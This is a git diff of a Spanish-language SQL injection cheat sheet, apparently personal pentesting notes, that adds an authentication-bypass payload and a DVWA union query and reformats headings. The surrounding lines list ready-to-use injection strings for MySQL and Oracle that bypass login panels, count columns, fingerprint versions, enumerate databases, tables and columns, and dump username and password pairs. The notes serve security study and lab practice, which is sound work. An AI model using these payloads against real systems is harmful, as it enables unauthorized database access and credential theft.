@@ -55,6 +55,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 
 ❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
 ❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
+❯ ' or 1=1 # 
 ❯ <user>'-- -                                         # Este se usa en un panel de login 
 ❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
 ❯ ' and if()-- a        
@@ -83,7 +84,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select NULL,banner from v$version-- -       # Mirar la version en Oracle
 ```
 
-### Para saber las bases de datos (DB) existentes
+## Para saber las bases de datos (DB) existentes
 
 ```bash 
 # MYSQL
@@ -93,7 +94,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes en una linea, pero separadas por comas
 ```
 
-### Para saber las tablas de la base de datos (DB) especifica
+## Para saber las tablas de la base de datos (DB) especifica
 
 ```bash
 # MYSQL
@@ -111,7 +112,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
 ```
 
-### Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica
+## Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica
 
 ```bash 
 # MYSQL 
@@ -127,7 +128,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'-- -   # Mostrar las columnas en Oracle 
 ```
 
-### Para que nos muestre los datos de las columnas
+## Para que nos muestre los datos de las columnas
 
 ```bash
 # MYSQL 
@@ -151,6 +152,11 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 # ORACLE
 
 ❯ ' union select username||':'||password from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
+```
+
+```bash 
+# DVWA
+❯ ' union select user,password from users #         
 ```
 
 ## Subir un archivo a una ruta especifica en la maquina victima
